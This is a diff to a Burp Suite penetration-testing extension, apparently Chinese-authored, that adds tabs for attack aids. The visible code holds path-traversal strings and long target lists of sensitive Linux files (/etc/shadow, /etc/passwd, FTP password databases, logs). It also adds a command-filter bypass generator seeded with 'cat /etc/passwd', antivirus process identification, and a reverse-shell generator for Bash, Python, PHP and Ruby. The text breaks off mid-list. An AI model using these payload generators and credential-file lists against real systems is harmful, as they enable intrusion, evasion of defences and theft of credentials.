@@ -2,13 +2,25 @@ package burp;
 import java.awt.Component;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import javax.swing.*;
 import java.awt.*;
+import java.net.URL;
+import java.net.URLConnection;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Random;
 import java.util.Calendar;
+import java.util.regex.*;
+import java.util.Base64;
+import java.io.UnsupportedEncodingException;
+import java.net.URLEncoder;
+import java.net.URLDecoder;
+import java.util.HashMap;
+import java.util.Map;
 
 
 public class BurpExtender implements IBurpExtender, ITab, IHttpListener
@@ -19,6 +31,7 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener
     public PrintWriter stdout;
     JTextArea jta;//存放日志输入
     JLabel rkl_lb_10;//用来显示生成弱口令字典数量
+    String xl_version = "1.7";
 
 
     @Override
@@ -28,7 +41,7 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener
         this.stdout = new PrintWriter(callbacks.getStdout(), true);
         this.stdout.println("hello xia Liao!");
         this.stdout.println("你好 欢迎使用 瞎料!");
-        this.stdout.println("version:1.3");
+        this.stdout.println("version:"+xl_version);
 
         // keep a reference to our callbacks object
         this.callbacks = callbacks;
@@ -37,7 +50,7 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener
         helpers = callbacks.getHelpers();
 
         // set our extension name
-        callbacks.setExtensionName("xp_Liao V1.3");
+        callbacks.setExtensionName("xp_Liao V"+xl_version);
 
         // create our UI
         SwingUtilities.invokeLater(new Runnable()
@@ -218,7 +231,7 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener
                 jps.setLayout(new GridLayout(8, 1)); //六行一列
                 JLabel jls=new JLabel("插件名：瞎料 author：算命縖子");    //创建一个标签
                 JLabel jls_1=new JLabel("吐司：www.t00ls.com");
-                JLabel jls_2=new JLabel("版本：xp_Liao V1.3");
+                JLabel jls_2=new JLabel("版本：xp_Liao V"+xl_version);
                 JLabel jls_3=new JLabel("感谢名单：Shinceho、SongS、S");
                 JButton btn1=new JButton("重新生成");
                 JLabel jls_4=new JLabel("");
@@ -383,6 +396,325 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener
                 });
 
 
+                //路径字典
+                JPanel dir_path = new JPanel();
+                JLabel dir_lb_1 = new JLabel("    跨目录");
+                JTextArea dir_ta_1 = new JTextArea(15,40);
+                dir_ta_1.setEditable(false);//不可编辑状态
+                JScrollPane dir_sp_1 =new JScrollPane(dir_ta_1);    //将文本域放入滚动窗口
+                String dir_tmep_data_1 = "";
+                String dir_tmep_data_2 = "";
+                for(int i=0;i<20;i++){
+                    dir_tmep_data_1 +="../";
+                    dir_tmep_data_2 += dir_tmep_data_1+"\n";
+                }
+                dir_ta_1.setText(dir_tmep_data_2);
+                dir_ta_1.setCaretPosition(0);//设置光标到最前面，用于把滚动条设置到最顶上
+
+                JLabel dir_lb_2 = new JLabel("    linux常见路径");
+                JTextArea dir_ta_2 = new JTextArea(15,40);
+                dir_ta_2.setEditable(false);//不可编辑状态
+                JScrollPane dir_sp_2 =new JScrollPane(dir_ta_2);    //将文本域放入滚动窗口
+                dir_ta_2.setText(linux_path());
+                dir_ta_2.setCaretPosition(0);//设置光标到最前面，用于把滚动条设置到最顶上
+
+                JLabel dir_lb_3 = new JLabel("    linux配置文件路径");
+                JTextArea dir_ta_3 = new JTextArea(15,40);
+                dir_ta_3.setEditable(false);//不可编辑状态
+                JScrollPane dir_sp_3 =new JScrollPane(dir_ta_3);    //将文本域放入滚动窗口
+                dir_ta_3.setText(linux_config());
+                dir_ta_3.setCaretPosition(0);//设置光标到最前面，用于把滚动条设置到最顶上
+
+                JLabel dir_lb_4 = new JLabel("    linux日志路径");
+                JTextArea dir_ta_4 = new JTextArea(15,40);
+                dir_ta_4.setEditable(false);//不可编辑状态
+                JScrollPane dir_sp_4 =new JScrollPane(dir_ta_4);    //将文本域放入滚动窗口
+                dir_ta_4.setText(linux_log());
+                dir_ta_4.setCaretPosition(0);//设置光标到最前面，用于把滚动条设置到最顶上
+
+                dir_path.add(dir_lb_1);
+                dir_path.add(dir_sp_1);
+                dir_path.add(dir_lb_2);
+                dir_path.add(dir_sp_2);
+                dir_path.add(dir_lb_3);
+                dir_path.add(dir_sp_3);
+                dir_path.add(dir_lb_4);
+                dir_path.add(dir_sp_4);
+                //指定面板的布局为GridLayout，4行2列，间隙为0
+                dir_path.setLayout(new GridLayout(4,2,5,5));
+
+                //临时笔记
+                JPanel temp_notepad = new JPanel();
+                temp_notepad.setLayout(new GridLayout(1, 1));
+                JTextArea temp_notepad_ta_1 = new JTextArea(15,40);
+                JScrollPane temp_notepad_sp_1 =new JScrollPane(temp_notepad_ta_1);    //将文本域放入滚动窗口
+                temp_notepad.add(temp_notepad_sp_1);
+
+                //数据库表/字段
+                JSplitPane sql_data = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);//左右
+                JPanel sql_data_z = new JPanel();//左
+                JTextArea sql_data_ta_1 = new JTextArea(15,40);
+                sql_data_ta_1.setText(sql_tabales());
+                sql_data_ta_1.setCaretPosition(0);//设置光标到最前面，用于把滚动条设置到最顶上
+                sql_data_ta_1.setEditable(false);//不可编辑状态
+                JScrollPane sql_sp_1 =new JScrollPane(sql_data_ta_1);    //将文本域放入滚动窗口
+                sql_data_z.setLayout(new GridLayout(1, 1));
+                sql_data_z.add(sql_sp_1);
+                JPanel sql_data_y = new JPanel();//右
+                JTextArea sql_data_ta_2 = new JTextArea(15,40);
+                sql_data_ta_2.setText(sql_columns());
+                sql_data_ta_2.setCaretPosition(0);//设置光标到最前面，用于把滚动条设置到最顶上
+                sql_data_ta_2.setEditable(false);//不可编辑状态
+                JScrollPane sql_sp_2 =new JScrollPane(sql_data_ta_2);    //将文本域放入滚动窗口
+                sql_data_y.setLayout(new GridLayout(1, 1));
+                sql_data_y.add(sql_sp_2);
+                sql_data.setLeftComponent(sql_data_z);//添加在左面
+                sql_data.setRightComponent(sql_data_y);//添加在右面
+
+
+                //Windows在线进程/杀软识别
+                JSplitPane tasklist = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);//左右
+                JPanel tasklist_data_z = new JPanel();//右
+                JTextArea tasklist_data_ta_1 = new JTextArea();
+                tasklist_data_ta_1.setText(windows_command());
+                tasklist_data_ta_1.setCaretPosition(0);//设置光标到最前面，用于把滚动条设置到最顶上
+                tasklist_data_ta_1.setEditable(false);//不可编辑状态
+                JScrollPane tasklist_sp_1 =new JScrollPane(tasklist_data_ta_1);    //将文本域放入滚动窗口
+                tasklist_data_z.setLayout(new GridLayout(1, 1));
+                tasklist_data_z.add(tasklist_sp_1);
+                JSplitPane tasklist_data_y = new JSplitPane(JSplitPane.VERTICAL_SPLIT);//右
+                JPanel tasklist_y_s = new JPanel();//左上
+                JButton tasklist_btn1=new JButton("本地查询");
+                JButton tasklist_btn2=new JButton("在线查询（比较全）");
+                JLabel tasklist_lb_1 = new JLabel("感谢小白提供的在线查询接口");
+                tasklist_y_s.add(tasklist_btn1);
+                tasklist_y_s.add(tasklist_btn2);
+                tasklist_y_s.add(tasklist_lb_1);
+                JPanel tasklist_y_x = new JPanel();//左下
+                JTextArea tasklist_data_ta_2 = new JTextArea(15,40);
+                tasklist_data_ta_2.setText("");
+                //tasklist_data_ta_2.setEditable(false);//不可编辑状态
+                JScrollPane tasklist_sp_2 =new JScrollPane(tasklist_data_ta_2);    //将文本域放入滚动窗口
+                tasklist_y_x.setLayout(new GridLayout(2, 1));
+                tasklist_y_x.add(tasklist_sp_2);
+                JTextArea tasklist_data_ta_3 = new JTextArea(15,40);
+                tasklist_data_ta_3.setText("等待查询……");
+                tasklist_data_ta_3.setEditable(false);//不可编辑状态
+                JScrollPane tasklist_sp_3 =new JScrollPane(tasklist_data_ta_3);    //将文本域放入滚动窗口
+                tasklist_y_x.setLayout(new GridLayout(2, 1));
+                tasklist_y_x.add(tasklist_sp_2);
+                tasklist_y_x.add(tasklist_sp_3);
+                //本地查询
+                tasklist_btn1.addActionListener(new ActionListener() {
+                    @Override
+                    public void actionPerformed(ActionEvent e) {
+                        tasklist_data_ta_3.setText(windows_local_tasklist(tasklist_data_ta_2.getText()));
+                    }
+                });
+                //在线查询
+                tasklist_btn2.addActionListener(new ActionListener() {
+                    @Override
+                    public void actionPerformed(ActionEvent e) {
+                        tasklist_data_ta_3.setText(windows_api_tasklist(tasklist_data_ta_2.getText()));
+                    }
+                });
+                tasklist_data_y.setLeftComponent(tasklist_y_s);//添加在上面
+                tasklist_data_y.setRightComponent(tasklist_y_x);//添加在下面
+                tasklist.setLeftComponent(tasklist_data_y);//添加在左面
+                tasklist.setRightComponent(tasklist_data_z);//添加在右面
+
+
+                //命令 Bypass
+                JPanel command_Bypass = new JPanel();
+                command_Bypass.setLayout(new GridLayout(6,1,5,5));
+                JTextArea command_Bypass_ta_1 = new JTextArea(15,40);
+                command_Bypass_ta_1.setText("cat /etc/passwd");
+                JScrollPane command_Bypass_sp_1 =new JScrollPane(command_Bypass_ta_1);    //将文本域放入滚动窗口
+                JButton command_Bypass_ok=new JButton("Bypass命令");
+
+
+                JTextArea command_Bypass_ta_2 = new JTextArea();
+                command_Bypass_ta_2.setBackground(Color.LIGHT_GRAY);    //设置背景色
+                command_Bypass_ta_2.setEditable(false);//不可编辑状态
+                JScrollPane command_Bypass_sp_2 =new JScrollPane(command_Bypass_ta_2);    //将文本域放入滚动窗口
+                JTextArea command_Bypass_ta_3 = new JTextArea();
+                command_Bypass_ta_3.setBackground(Color.LIGHT_GRAY);    //设置背景色
+                command_Bypass_ta_3.setEditable(false);//不可编辑状态
+                JScrollPane command_Bypass_sp_3 =new JScrollPane(command_Bypass_ta_3);    //将文本域放入滚动窗口
+                JTextArea command_Bypass_ta_4 = new JTextArea();
+                command_Bypass_ta_4.setBackground(Color.LIGHT_GRAY);    //设置背景色
+                command_Bypass_ta_4.setEditable(false);//不可编辑状态
+                JScrollPane command_Bypass_sp_4 =new JScrollPane(command_Bypass_ta_4);    //将文本域放入滚动窗口
+                JTextArea command_Bypass_ta_5 = new JTextArea();
+                command_Bypass_ta_5.setBackground(Color.LIGHT_GRAY);    //设置背景色
+                command_Bypass_ta_5.setEditable(false);//不可编辑状态
+                JScrollPane command_Bypass_sp_5 =new JScrollPane(command_Bypass_ta_5);    //将文本域放入滚动窗口
+
+                //先执行一遍，把文本框填充一下，不容空空如也，不好看
+                String[] command_Bypass_list = command_Bypass_get(command_Bypass_ta_1.getText());
+                command_Bypass_ta_2.setText(command_Bypass_list[0]);
+                command_Bypass_ta_3.setText(command_Bypass_list[1]);
+                command_Bypass_ta_4.setText(command_Bypass_list[2]);
+                command_Bypass_ta_5.setText(command_Bypass_list[3]);
+
+
+                command_Bypass_ok.addActionListener(new ActionListener() {
+                    @Override
+                    public void actionPerformed(ActionEvent e) {
+                        String[] command_Bypass_list = command_Bypass_get(command_Bypass_ta_1.getText());
+                        command_Bypass_ta_2.setText(command_Bypass_list[0]);
+                        command_Bypass_ta_3.setText(command_Bypass_list[1]);
+                        command_Bypass_ta_4.setText(command_Bypass_list[2]);
+                        command_Bypass_ta_5.setText(command_Bypass_list[3]);
+                    }
+                });
+
+                command_Bypass.add(command_Bypass_sp_1);
+                command_Bypass.add(command_Bypass_ok);
+                command_Bypass.add(command_Bypass_sp_2);
+                command_Bypass.add(command_Bypass_sp_3);
+                command_Bypass.add(command_Bypass_sp_4);
+                command_Bypass.add(command_Bypass_sp_5);
+
+                //反弹shell界面
+                JSplitPane ftx_jp = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
+                JPanel ftx_jp_1 = new JPanel();//上面
+                ftx_jp_1.setLayout(new GridLayout(1,10,10,5));
+                JLabel ftx_lb_1=new JLabel("ip:",SwingConstants.RIGHT);
+                JTextField ftx_txtfield_1=new JTextField("127.0.0.1",1);
+                JLabel ftx_lb_2=new JLabel("端口:",SwingConstants.RIGHT);
+                JTextField ftx_txtfield_2=new JTextField("8080",1);
+                JButton ftx_bt_1 = new JButton("生成");
+                ftx_jp_1.add(ftx_lb_1);
+                ftx_jp_1.add(ftx_txtfield_1);
+                ftx_jp_1.add(ftx_lb_2);
+                ftx_jp_1.add(ftx_txtfield_2);
+                ftx_jp_1.add(ftx_bt_1);
+                JPanel ftx_jp_2 = new JPanel();//下面
+                ftx_jp_2.setLayout(new GridLayout(25,1,5,8));
+                JLabel ftx_lb_2_1 = new JLabel("Bash TCP:");
+                JTextField ftx_txtfield_2_1=new JTextField("",1);
+                ftx_txtfield_2_1.setEditable(false);
+                ftx_txtfield_2_1.setBackground(Color.LIGHT_GRAY);    //设置背景色
+                JTextField ftx_txtfield_2_2=new JTextField("",1);
+                ftx_txtfield_2_2.setEditable(false);
+                ftx_txtfield_2_2.setBackground(Color.LIGHT_GRAY);    //设置背景色
+                JTextField ftx_txtfield_2_3=new JTextField("",1);
+                ftx_txtfield_2_3.setEditable(false);
+                ftx_txtfield_2_3.setBackground(Color.LIGHT_GRAY);    //设置背景色
+                JTextField ftx_txtfield_2_4=new JTextField("",1);
+                ftx_txtfield_2_4.setEditable(false);
+                ftx_txtfield_2_4.setBackground(Color.LIGHT_GRAY);    //设置背景色
+                JTextField ftx_txtfield_2_5=new JTextField("",1);
+                ftx_txtfield_2_5.setEditable(false);
+                ftx_txtfield_2_5.setBackground(Color.LIGHT_GRAY);    //设置背景色
+                JLabel ftx_lb_2_2 = new JLabel("Bash UDP:");
+                JTextField ftx_txtfield_2_6=new JTextField("",1);
+                ftx_txtfield_2_6.setEditable(false);
+                ftx_txtfield_2_6.setBackground(Color.LIGHT_GRAY);    //设置背景色
+                JTextField ftx_txtfield_2_7=new JTextField("",1);
+                ftx_txtfield_2_7.setEditable(false);
+                ftx_txtfield_2_7.setBackground(Color.LIGHT_GRAY);    //设置背景色
+                JLabel ftx_lb_2_3 = new JLabel("Python:");
+                JTextField ftx_txtfield_2_8=new JTextField("",1);
+                ftx_txtfield_2_8.setEditable(false);
+                ftx_txtfield_2_8.setBackground(Color.LIGHT_GRAY);    //设置背景色
+                JTextField ftx_txtfield_2_9=new JTextField("",1);
+                ftx_txtfield_2_9.setEditable(false);
+                ftx_txtfield_2_9.setBackground(Color.LIGHT_GRAY);    //设置背景色
+                JTextField ftx_txtfield_2_10=new JTextField("",1);
+                ftx_txtfield_2_10.setEditable(false);
+                ftx_txtfield_2_10.setBackground(Color.LIGHT_GRAY);    //设置背景色
+                JLabel ftx_lb_2_4 = new JLabel("PHP:");
+                JTextField ftx_txtfield_2_11=new JTextField("",1);
+                ftx_txtfield_2_11.setEditable(false);
+                ftx_txtfield_2_11.setBackground(Color.LIGHT_GRAY);    //设置背景色
+                JTextField ftx_txtfield_2_12=new JTextField("",1);
+                ftx_txtfield_2_12.setEditable(false);
+                ftx_txtfield_2_12.setBackground(Color.LIGHT_GRAY);    //设置背景色
+                JTextField ftx_txtfield_2_13=new JTextField("",1);
+                ftx_txtfield_2_13.setEditable(false);
+                ftx_txtfield_2_13.setBackground(Color.LIGHT_GRAY);    //设置背景色
+                JTextField ftx_txtfield_2_14=new JTextField("",1);
+                ftx_txtfield_2_14.setEditable(false);
+                ftx_txtfield_2_14.setBackground(Color.LIGHT_GRAY);    //设置背景色
+                JLabel ftx_lb_2_5 = new JLabel("Ruby:");
+                JTextField ftx_txtfield_2_15=new JTextField("",1);
+                ftx_txtfield_2_15.setEditable(false);
+                ftx_txtfield_2_15.setBackground(Color.LIGHT_GRAY);    //设置背景色
+                JTextField ftx_txtfield_2_16=new JTextField("",1);
+                ftx_txtfield_2_16.setEditable(false);
+                ftx_txtfield_2_16.setBackground(Color.LIGHT_GRAY);    //设置背景色
+
+                ftx_jp_2.add(ftx_lb_2_1);
+                ftx_jp_2.add(ftx_txtfield_2_1);
+                ftx_jp_2.add(ftx_txtfield_2_2);
+                ftx_jp_2.add(ftx_txtfield_2_3);
+                ftx_jp_2.add(ftx_txtfield_2_4);
+                ftx_jp_2.add(ftx_txtfield_2_5);
+                ftx_jp_2.add(ftx_lb_2_2);
+                ftx_jp_2.add(ftx_txtfield_2_6);
+                ftx_jp_2.add(ftx_txtfield_2_7);
+                ftx_jp_2.add(ftx_lb_2_3);
+                ftx_jp_2.add(ftx_txtfield_2_8);
+                ftx_jp_2.add(ftx_txtfield_2_9);
+                ftx_jp_2.add(ftx_txtfield_2_10);
+                ftx_jp_2.add(ftx_lb_2_4);
+                ftx_jp_2.add(ftx_txtfield_2_11);
+                ftx_jp_2.add(ftx_txtfield_2_12);
+                ftx_jp_2.add(ftx_txtfield_2_13);
+                ftx_jp_2.add(ftx_txtfield_2_14);
+                ftx_jp_2.add(ftx_lb_2_5);
+                ftx_jp_2.add(ftx_txtfield_2_15);
+                ftx_jp_2.add(ftx_txtfield_2_16);
+
+                ftx_jp.setLeftComponent(ftx_jp_1);
+                ftx_jp.setRightComponent(ftx_jp_2);
+
+                ftx_bt_1.addActionListener(new ActionListener() {
+                @Override
+                public void actionPerformed(ActionEvent e) {
+                    String[] reverse_shell_list = reverse_shell(ftx_txtfield_1.getText(),ftx_txtfield_2.getText());
+                    ftx_txtfield_2_1.setText(reverse_shell_list[0]);
+                    ftx_txtfield_2_2.setText(reverse_shell_list[1]);
+                    ftx_txtfield_2_3.setText(reverse_shell_list[2]);
+                    ftx_txtfield_2_4.setText(reverse_shell_list[3]);
+                    ftx_txtfield_2_5.setText(reverse_shell_list[4]);
+                    ftx_txtfield_2_6.setText(reverse_shell_list[5]);
+                    ftx_txtfield_2_7.setText(reverse_shell_list[6]);
+                    ftx_txtfield_2_8.setText(reverse_shell_list[7]);
+                    ftx_txtfield_2_9.setText(reverse_shell_list[8]);
+                    ftx_txtfield_2_10.setText(reverse_shell_list[9]);
+                    ftx_txtfield_2_11.setText(reverse_shell_list[10]);
+                    ftx_txtfield_2_12.setText(reverse_shell_list[11]);
+                    ftx_txtfield_2_13.setText(reverse_shell_list[12]);
+                    ftx_txtfield_2_14.setText(reverse_shell_list[13]);
+                    ftx_txtfield_2_15.setText(reverse_shell_list[14]);
+                    ftx_txtfield_2_16.setText(reverse_shell_list[15]);
+                    }
+                });
+
+                //格式转换
+                JPanel gszh_jp = new JPanel();
+                gszh_jp.setLayout(new GridLayout(25,1,10,5));
+                JLabel gszh_lb_1 = new JLabel("请输入URL格式/json格式，进行转换");
+                JTextField gszh_tf_1 = new JTextField("username=admin&password=123456");
+                JButton gszh_bt_1 = new JButton("转换");
+                JTextField gszh_tf_2 = new JTextField("");
+                gszh_tf_2.setEditable(false);
+                gszh_tf_2.setBackground(Color.LIGHT_GRAY);    //设置背景色
+                gszh_jp.add(gszh_lb_1);
+                gszh_jp.add(gszh_tf_1);
+                gszh_jp.add(gszh_bt_1);
+                gszh_jp.add(gszh_tf_2);
+
+                gszh_bt_1.addActionListener(new ActionListener() {
+                    @Override
+                    public void actionPerformed(ActionEvent e) {
+                        gszh_tf_2.setText(convert_data(gszh_tf_1.getText()));
+                    }
+                });
+
 
 
 
@@ -390,6 +722,13 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener
                 tabs = new JTabbedPane();
                 tabs.addTab("信息生成",splitPane);
                 tabs.addTab("弱口令生成",rkl_jp);
+                tabs.addTab("路径字典",dir_path);
+                tabs.addTab("临时笔记",temp_notepad);
+                tabs.addTab("数据库表/字段",sql_data);
+                tabs.addTab("Windows在线进程/杀软识别",tasklist);
+                tabs.addTab("命令Bypass",command_Bypass);
+                tabs.addTab("反弹shell生成",ftx_jp);
+                tabs.addTab("格式转换（URL格式/json格式）",gszh_jp);
 
                 // 信息生成界面 整体分布
                 splitPane.setLeftComponent(splitPanes_2);//添加在左面
@@ -850,6 +1189,330 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener
 
 
 
+    }
+
+    //linux常见路径
+    private String linux_path(){
+        String data = "/etc/passwd#/etc/shadow#/etc/fstab#/etc/host.conf#/etc/motd#/etc/ld.so.conf#/var/www/htdocs/index.php#/var/www/conf/httpd.conf#/var/www/htdocs/index.html#/var/httpd/conf/php.ini#/var/httpd/htdocs/index.php#/var/httpd/conf/httpd.conf#/var/httpd/htdocs/index.html#/var/httpd/conf/php.ini#/var/www/index.html#/var/www/index.php#/opt/www/conf/httpd.conf#/opt/www/htdocs/index.php#/opt/www/htdocs/index.html#/usr/local/apache/htdocs/index.html#/usr/local/apache/htdocs/index.php#/usr/local/apache2/htdocs/index.html#/usr/local/apache2/htdocs/index.php#/usr/local/httpd2.2/htdocs/index.php#/usr/local/httpd2.2/htdocs/index.html#/tmp/apache/htdocs/index.html#/tmp/apache/htdocs/index.php#/etc/httpd/htdocs/index.php#/etc/httpd/conf/httpd.conf#/etc/httpd/htdocs/index.html#/www/php/php.ini#/www/php4/php.ini#/www/php5/php.ini#/www/conf/httpd.conf#/www/htdocs/index.php#/www/htdocs/index.html#/usr/local/httpd/conf/httpd.conf#/apache/apache/conf/httpd.conf#/apache/apache2/conf/httpd.conf#/etc/apache/apache.conf#/etc/apache2/apache.conf#/etc/apache/httpd.conf#/etc/apache2/httpd.conf#/etc/apache2/vhosts.d/00_default_vhost.conf#/etc/apache2/sites-available/default#/etc/phpmyadmin/config.inc.php#/etc/mysql/my.cnf#/etc/httpd/conf.d/php.conf#/etc/httpd/conf.d/httpd.conf#/etc/httpd/logs/error_log#/etc/httpd/logs/error.log#/etc/httpd/logs/access_log#/etc/httpd/logs/access.log#/home/apache/conf/httpd.conf#/home/apache2/conf/httpd.conf#/var/log/apache/error_log#/var/log/apache/error.log#/var/log/apache/access_log#/var/log/apache/access.log#/var/log/apache2/error_log#/var/log/apache2/error.log#/var/log/apache2/access_log#/var/log/apache2/access.log#/var/www/logs/error_log#/var/www/logs/error.log#/var/www/logs/access_log#/var/www/logs/access.log#/usr/local/apache/logs/error_log#/usr/local/apache/logs/error.log#/usr/local/apache/logs/access_log#/usr/local/apache/logs/access.log#/var/log/error_log#/var/log/error.log#/var/log/access_log#/var/log/access.log#/usr/local/apache/logs/access_logaccess_log.old#/usr/local/apache/logs/error_logerror_log.old#/etc/php.ini#/bin/php.ini#/etc/init.d/httpd#/etc/init.d/mysql#/etc/httpd/php.ini#/usr/lib/php.ini#/usr/lib/php/php.ini#/usr/local/etc/php.ini#/usr/local/lib/php.ini#/usr/local/php/lib/php.ini#/usr/local/php4/lib/php.ini#/usr/local/php4/php.ini#/usr/local/php4/lib/php.ini#/usr/local/php5/lib/php.ini#/usr/local/php5/etc/php.ini#/usr/local/php5/php5.ini#/usr/local/apache/conf/php.ini#/usr/local/apache/conf/httpd.conf#/usr/local/apache2/conf/httpd.conf#/usr/local/apache2/conf/php.ini#/etc/php4.4/fcgi/php.ini#/etc/php4/apache/php.ini#/etc/php4/apache2/php.ini#/etc/php5/apache/php.ini#/etc/php5/apache2/php.ini#/etc/php/php.ini#/etc/php/php4/php.ini#/etc/php/apache/php.ini#/etc/php/apache2/php.ini#/web/conf/php.ini#/usr/local/Zend/etc/php.ini#/opt/xampp/etc/php.ini#/var/local/www/conf/php.ini#/var/local/www/conf/httpd.conf#/etc/php/cgi/php.ini#/etc/php4/cgi/php.ini#/etc/php5/cgi/php.ini#/php5/php.ini#/php4/php.ini#/php/php.ini#/PHP/php.ini#/apache/php/php.ini#/xampp/apache/bin/php.ini#/xampp/apache/conf/httpd.conf#/NetServer/bin/stable/apache/php.ini#/home2/bin/stable/apache/php.ini#/home/bin/stable/apache/php.ini#/var/log/mysql/mysql-bin.log#/var/log/mysql.log#/var/log/mysqlderror.log#/var/log/mysql/mysql.log#/var/log/mysql/mysql-slow.log#/var/mysql.log#/var/lib/mysql/my.cnf#/usr/local/mysql/my.cnf#/usr/local/mysql/bin/mysql#/etc/mysql/my.cnf#/etc/my.cnf#/usr/local/cpanel/logs#/usr/local/cpanel/logs/stats_log#/usr/local/cpanel/logs/access_log#/usr/local/cpanel/logs/error_log#/usr/local/cpanel/logs/license_log#/usr/local/cpanel/logs/login_log#/usr/local/cpanel/logs/stats_log#/usr/local/share/examples/php4/php.ini#/usr/local/share/examples/php/php.ini";
+        data = data.replace("#","\n");
+        return data;
+    }
+
+    //linux配置文件路径
+    private String linux_config(){
+        String data = "/NetServer/bin/stable/apache/php.ini#/PHP/php.ini#/Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf#/Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf#/Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf#/Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php#/Volumes/Macintosh_HD1/usr/local/php/lib/php.ini#/Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php#/Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php#/Volumes/webBackup/opt/apache2/conf/httpd.conf#/Volumes/webBackup/private/etc/httpd/httpd.conf#/Volumes/webBackup/private/etc/httpd/httpd.conf.default#/apache/php/php.ini#/bin/php.ini#/etc/apache/conf/httpd.conf#/etc/apache2/apache2.conf#/etc/apache2/conf/httpd.conf#/etc/apache2/httpd.conf#/etc/chrootUsers#/etc/ftpchroot#/etc/ftphosts/etc/motd#/etc/group#/etc/http/conf/httpd.conf#/etc/http/httpd.conf#/etc/httpd.conf#/etc/httpd/conf/httpd.conf#/etc/httpd/httpd.conf#/etc/httpd/php.ini#/etc/issue#/etc/logrotate.d/ftp#/etc/logrotate.d/proftpd#/etc/my.cnf#/etc/mysql/my.cnf#/etc/passwd#/etc/php.ini#/etc/php/apache/php.ini#/etc/php/apache2/php.ini#/etc/php/cgi/php.ini#/etc/php/php.ini#/etc/php/php4/php.ini#/etc/php4.4/fcgi/php.ini#/etc/php4/apache/php.ini#/etc/php4/apache2/php.ini#/etc/php4/cgi/php.ini#/etc/php5/apache/php.ini#/etc/php5/apache2/php.ini#/etc/php5/cgi/php.ini#/etc/proftp.conf#/etc/proftpd/modules.conf#/etc/protpd/proftpd.conf#/etc/pure-ftpd.conf#/etc/pure-ftpd/pure-ftpd.conf#/etc/pure-ftpd/pure-ftpd.pdb#/etc/pure-ftpd/pureftpd.pdb#/etc/pureftpd.passwd#/etc/pureftpd.pdb#/etc/security/environ#/etc/security/group#/etc/security/limits#/etc/security/passwd#/etc/security/user#/etc/shadow#/etc/vhcs2/proftpd/proftpd.conf#/etc/vsftpd.chroot_list#/etc/vsftpd.conf#/etc/vsftpd/vsftpd.conf#/etc/wu-ftpd/ftphosts#/etc/wu-ftpd/ftpusers#/home/bin/stable/apache/php.ini#/home2/bin/stable/apache/php.ini#/opt/apache/conf/httpd.conf#/opt/apache2/conf/httpd.conf#/opt/xampp/etc/php.ini#/php/php.ini#/php4/php.ini#/php5/php.ini#/private/etc/httpd/httpd.conf#/private/etc/httpd/httpd.conf.default#/usr/apache/conf/httpd.conf#/usr/apache2/conf/httpd.conf#/usr/etc/pure-ftpd.conf#/usr/lib/php.ini#/usr/lib/php/php.ini#/usr/lib/security/mkuser.default#/usr/local/Zend/etc/php.ini#/usr/local/apache/conf/httpd.conf#/usr/local/apache/conf/php.ini#/usr/local/apache/httpd.conf#/usr/local/apache2/conf/httpd.conf#/usr/local/apache2/httpd.conf#/usr/local/apps/apache/conf/httpd.conf#/usr/local/apps/apache2/conf/httpd.conf#/usr/local/etc/apache/conf/httpd.conf#/usr/local/etc/apache/vhosts.conf#/usr/local/etc/apache2/conf/httpd.conf#/usr/local/etc/httpd/conf/httpd.conf#/usr/local/etc/php.ini#/usr/local/etc/pure-ftpd.conf#/usr/local/etc/pureftpd.pdb#/usr/local/httpd/conf/httpd.conf#/usr/local/lib/php.ini#/usr/local/php/httpd.conf#/usr/local/php/httpd.conf.php#/usr/local/php/lib/php.ini#/usr/local/php4/httpd.conf#/usr/local/php4/httpd.conf.php#/usr/local/php4/lib/php.ini#/usr/local/php5/httpd.conf#/usr/local/php5/httpd.conf.php#/usr/local/php5/lib/php.ini#/usr/local/pureftpd/etc/pure-ftpd.conf#/usr/local/pureftpd/etc/pureftpd.pdb#/usr/local/pureftpd/sbin/pure-config.pl#/usr/pkgsrc/net/pureftpd/#/usr/ports/contrib/pure-ftpd/#/usr/ports/net/pure-ftpd/#/usr/sbin/pure-config.pl#/var/lib/mysql/my.cnf#/var/local/www/conf/php.ini#/var/www/conf/httpd.conf#/web/conf/php.ini#/xampp/apache/bin/php.ini";
+        data = data.replace("#","\n");
+        return data;
+    }
+
+    //linux日志路径
+    private String linux_log(){
+        String data = "/Program Files/Apache Group/Apache/logs/access.log#/Program Files/Apache Group/Apache/logs/error.log#/apache/logs/access.log#/apache/logs/error.log#/apache2/logs/access.log#/apache2/logs/error.log#/etc/httpd/logs/acces.log#/etc/httpd/logs/acces_log#/etc/httpd/logs/access.log#/etc/httpd/logs/access_log#/etc/httpd/logs/error.log#/etc/httpd/logs/error_log#/etc/logrotate.d/vsftpd.log#/etc/wu-ftpd/ftpaccess#/logs/access.log#/logs/access_log#/logs/error.log#/logs/error_log#/logs/pure-ftpd.log#/opt/lampp/logs/access.log#/opt/lampp/logs/access_log#/opt/lampp/logs/error.log#/opt/lampp/logs/error_log#/opt/xampp/logs/access.log#/opt/xampp/logs/access_log#/opt/xampp/logs/error.log#/opt/xampp/logs/error_log#/usr/local/apache/log#/usr/local/apache/logs#/usr/local/apache/logs/access.log#/usr/local/apache/logs/access_log#/usr/local/apache/logs/error.log#/usr/local/apache/logs/error_log#/usr/local/apache2/logs/access.log#/usr/local/apache2/logs/access_log#/usr/local/apache2/logs/error.log#/usr/local/apache2/logs/error_log#/usr/local/cpanel/logs#/usr/local/cpanel/logs/access_log#/usr/local/cpanel/logs/error_log#/usr/local/cpanel/logs/license_log#/usr/local/cpanel/logs/login_log#/usr/local/cpanel/logs/stats_log#/usr/local/